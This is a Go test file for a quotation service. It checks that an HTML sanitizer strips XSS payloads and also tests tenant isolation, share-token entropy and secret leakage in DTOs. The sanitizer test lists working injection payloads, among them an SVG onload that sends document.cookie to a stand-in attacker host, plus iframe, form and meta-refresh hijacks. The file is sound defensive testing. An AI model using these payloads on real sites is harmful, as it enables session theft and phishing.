package service_test

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"sync"
	"testing"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"venturo-skeleton-go/internal/modules/quotation/domain"
	"venturo-skeleton-go/internal/modules/quotation/dto"
	"venturo-skeleton-go/internal/modules/quotation/service"
)

func TestSecurity_AdversarialHTMLSanitizerComprehensive(t *testing.T) {
	sanitizer := service.NewHTMLSanitizer()

	payloads := []struct {
		name      string
		dirty     string
		forbidden []string
	}{
		{
			name:      "script tag injection",
			dirty:     `<p>Safe</p><script>alert('xss')</script>`,
			forbidden: []string{"<script", "alert('xss')"},
		},
		{
			name:      "mixed-case script tag injection",
			dirty:     `<p>Safe</p><ScRiPt>alert('mixed-case-xss')</sCrIpT>`,
			forbidden: []string{"<script", "alert('mixed-case-xss')"},
		},
		{
			name:      "iframe stealth embed",
			dirty:     `<iframe src="https://attacker.site/steal-token"></iframe><p>Continuation</p>`,
			forbidden: []string{"<iframe", "attacker.site"},
		},
		{
			name:      "svg onload trigger",
			dirty:     `<svg><g onload="javascript:fetch('//attacker.site/'+document.cookie)"></g></svg>`,
			forbidden: []string{"<svg", "onload", "document.cookie"},
		},
		{
			name:      "javascript pseudo-protocol in anchor",
			dirty:     `<a href="javascript:doSomethingEvil()">Click here</a>`,
			forbidden: []string{"javascript:", "doSomethingEvil"},
		},
		{
			name:      "data URI in anchor",
			dirty:     `<a href="data:text/html,<script>alert(1)</script>">Phishing Link</a>`,
			forbidden: []string{"data:text/html", "alert(1)"},
		},
		{
			name:      "event handler attributes (onerror, onmouseover, onclick)",
			dirty:     `<img src="invalid.jpg" onerror="alert(1)" onclick="steal()" onmouseover="log()"/>`,
			forbidden: []string{"onerror", "onclick", "onmouseover"},
		},
		{
			name:      "CSS background url tracking in style attribute",
			dirty:     `<div style="background-image: url('http://evil.com/tracker.png')">Content</div>`,
			forbidden: []string{"url(", "evil.com", "style="},
		},
		{
			name:      "embedded style tag with url tracking",
			dirty:     `<style>body { background: url('https://evil.com/leak'); }</style><p>Content</p>`,
			forbidden: []string{"<style", "evil.com"},
		},
		{
			name:      "form hijack with external action",
			dirty:     `<form action="https://attacker.site/steal-credentials"><input type="password"/></form>`,
			forbidden: []string{"<form", "action", "attacker.site"},
		},
		{
			name:      "meta refresh redirect hijack",
			dirty:     `<meta http-equiv="refresh" content="0;url=https://attacker.site/"><p>Redirecting</p>`,
			forbidden: []string{"<meta", "http-equiv", "attacker.site"},
		},
		{
			name:      "base tag hijack",
			dirty:     `<base href="https://attacker.site/"><p>Document</p>`,
			forbidden: []string{"<base", "attacker.site"},
		},
		{
			name:      "object and embed tags",
			dirty:     `<object data="evil.swf"></object><embed src="evil.swf"/><p>Safe</p>`,
			forbidden: []string{"<object", "<embed", "evil.swf"},
		},
		{
			name:      "nested malformed tables injection",
			dirty:     `<table><tr><td><table><tr><td>Nested</td></tr></table></td></tr></table>`,
			forbidden: []string{}, // Must parse safely without crashing or malforming
		},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			clean, err := sanitizer.Sanitize(tc.dirty)
			require.NoError(t, err)
			for _, forb := range tc.forbidden {
				assert.False(t, strings.Contains(strings.ToLower(clean), strings.ToLower(forb)),
					"output must not contain forbidden snippet %q", forb)
			}
		})
	}
}

func TestSecurity_HTMLSanitizerConcurrentAccess(t *testing.T) {
	sanitizer := service.NewHTMLSanitizer()
	const concurrency = 50
	var wg sync.WaitGroup
	wg.Add(concurrency)

	for i := 0; i < concurrency; i++ {
		go func(iteration int) {
			defer wg.Done()
			payload := `<p>Paragraph <a>link</a></p><script>alert('xss')</script>`
			cleaned, err := sanitizer.Sanitize(payload)
			assert.NoError(t, err)
			assert.False(t, strings.Contains(cleaned, "<script"))
			assert.True(t, strings.Contains(cleaned, "Paragraph"))
		}(i)
	}

	wg.Wait()
}

func TestSecurity_TenantCrossIDStrictIsolation(t *testing.T) {
	companyA := uuid.New()
	companyB := uuid.New()

	// 1. Quotation master isolation
	quotationA := &domain.Quotation{
		ID:              uuid.New(),
		CompanyID:       companyA,
		QuotationNumber: "QUO/2026/A001",
	}
	assert.False(t, quotationA.CompanyID == companyB, "Company B must NEVER access Company A quotation")

	// 2. Blueprint isolation
	blueprintA := &domain.Blueprint{
		ID:        uuid.New(),
		CompanyID: companyA,
		Title:     "Internal Blueprint A",
	}
	assert.False(t, blueprintA.CompanyID == companyB, "Company B must NEVER access Company A blueprint")

	// 3. Quotation Revision isolation
	revisionA := &domain.QuotationRevision{
		ID:             uuid.New(),
		CompanyID:      companyA,
		QuotationID:    quotationA.ID,
		RevisionNumber: 1,
	}
	assert.False(t, revisionA.CompanyID == companyB, "Company B must NEVER access Company A quotation revision")

	// 4. ShareLink isolation
	shareLinkA := &domain.ShareLink{
		ID:          uuid.New(),
		CompanyID:   companyA,
		BlueprintID: blueprintA.ID,
		TokenHash:   "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
	}
	assert.False(t, shareLinkA.CompanyID == companyB, "Company B must NEVER access Company A share link")

	// 5. RateCard isolation
	rateCardA := &domain.RateCard{
		ID:        uuid.New(),
		CompanyID: companyA,
		Code:      "RC-COMPANY-A",
		Name:      "Standard A",
	}
	assert.False(t, rateCardA.CompanyID == companyB, "Company B must NEVER access Company A rate card")

	// 6. Skill isolation
	skillA := &domain.Skill{
		ID:        uuid.New(),
		CompanyID: companyA,
		Name:      "Skill A",
		Command:   "/skill-a",
	}
	assert.False(t, skillA.CompanyID == companyB, "Company B must NEVER access Company A custom skill")
}

func TestSecurity_PublicTokenEntropyAndZeroPlaintext(t *testing.T) {
	rawToken, tokenHash, err := service.GenerateShareToken()
	require.NoError(t, err)

	// 1. Raw token length >= 32 bytes of CSPRNG randomness (RawURLEncoding >= 43 chars)
	rawBytes, err := base64.RawURLEncoding.DecodeString(rawToken)
	require.NoError(t, err)
	assert.GreaterOrEqual(t, len(rawBytes), 32, "token must contain at least 32 bytes of CSPRNG entropy")

	// 2. Token hash must be exactly 64 characters lowercase hexadecimal (SHA-256)
	assert.Len(t, tokenHash, 64)
	assert.Regexp(t, "^[a-f0-9]{64}$", tokenHash)

	// 3. Raw token must NEVER equal hash
	assert.NotEqual(t, rawToken, tokenHash)

	// 4. HashShareToken consistency
	assert.Equal(t, service.HashShareToken(rawToken), tokenHash, "HashShareToken must deterministically reproduce the hash")

	// 5. Statistical collision resistance: generate 100 consecutive tokens
	const numTokens = 100
	tokensSeen := make(map[string]struct{}, numTokens)
	hashesSeen := make(map[string]struct{}, numTokens)

	for i := 0; i < numTokens; i++ {
		tok, hsh, genErr := service.GenerateShareToken()
		require.NoError(t, genErr)
		assert.NotEmpty(t, tok)
		assert.NotEmpty(t, hsh)

		_, tokExists := tokensSeen[tok]
		assert.False(t, tokExists, "CSPRNG tokens must never collide")
		tokensSeen[tok] = struct{}{}

		_, hashExists := hashesSeen[hsh]
		assert.False(t, hashExists, "Token hashes must never collide")
		hashesSeen[hsh] = struct{}{}
	}
}

func TestSecurity_ZeroSecretLeakageInDTOAndLogs(t *testing.T) {
	secretAPIKey := "AIzaSyD-SUPER_SECRET_PRODUCTION_KEY_12345"
	encryptionKey := "0123456789abcdef0123456789abcdef"
	databasePassword := "p@ssw0rdSuperSecretDatabase2026!"

	programmerDTO := dto.ProgrammerBlueprintDTO{
		Title:              "E-Commerce System",
		RevisionNumber:     1,
		CompletenessStatus: "complete",
		Summary:            "Architectural breakdown",
	}

	marshaled, err := json.Marshal(programmerDTO)
	require.NoError(t, err)
	jsonStr := string(marshaled)

	// Verify zero secret leakage
	assert.False(t, strings.Contains(jsonStr, secretAPIKey), "DTO must not contain API keys")
	assert.False(t, strings.Contains(jsonStr, encryptionKey), "DTO must not contain encryption keys")
	assert.False(t, strings.Contains(jsonStr, databasePassword), "DTO must not contain database credentials")

	// Verify forbidden internal/financial fields are not present in Programmer DTO
	forbiddenFields := []string{
		"budget",
		"rate_card",
		"company_id",
		"created_by",
		"prompt",
		"client_name",
		"quotation_number",
		"token_hash",
		"internal_id",
		"margin",
		"client_tier",
	}

	for _, field := range forbiddenFields {
		assert.False(t, strings.Contains(strings.ToLower(jsonStr), field),
			"Programmer DTO must not expose forbidden field %q", field)
	}
}
